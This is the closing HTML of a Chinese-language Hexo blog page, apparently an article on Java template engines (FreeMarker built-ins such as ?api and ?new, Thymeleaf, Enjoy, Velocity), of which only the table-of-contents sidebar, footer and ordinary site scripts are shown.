class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80"><span class="nav-text">环境基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95-2"><span class="nav-text">基本语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%80%BC%EF%BC%88Interpolations%EF%BC%89"><span class="nav-text">插值（Interpolations）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%EF%BC%88FTL-%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="nav-text">常用指令（FTL 标签）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">内置函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#api%EF%BC%9A%E6%8A%8A%E6%A8%A1%E6%9D%BF%E5%8F%98%E9%87%8F%E2%80%9C%E5%88%87%E6%8D%A2%E6%88%90-Java-%E8%A7%86%E8%A7%92%E2%80%9D"><span class="nav-text">?api：把模板变量“切换成 Java 视角”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#new%EF%BC%9A%E5%9C%A8%E6%A8%A1%E6%9D%BF%E9%87%8C%E2%80%9C%E6%8C%89%E7%B1%BB%E5%90%8D%E5%8F%8D%E5%B0%84%E5%AE%9E%E4%BE%8B%E5%8C%96%E2%80%9D"><span class="nav-text">?new：在模板里“按类名反射实例化”</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Thymeleaf"><span class="nav-text">Thymeleaf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enjoy"><span class="nav-text">Enjoy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Velocity"><span class="nav-text">Velocity</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        56 posts in total
                    </span>
                    
                        <span>
                            1114.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>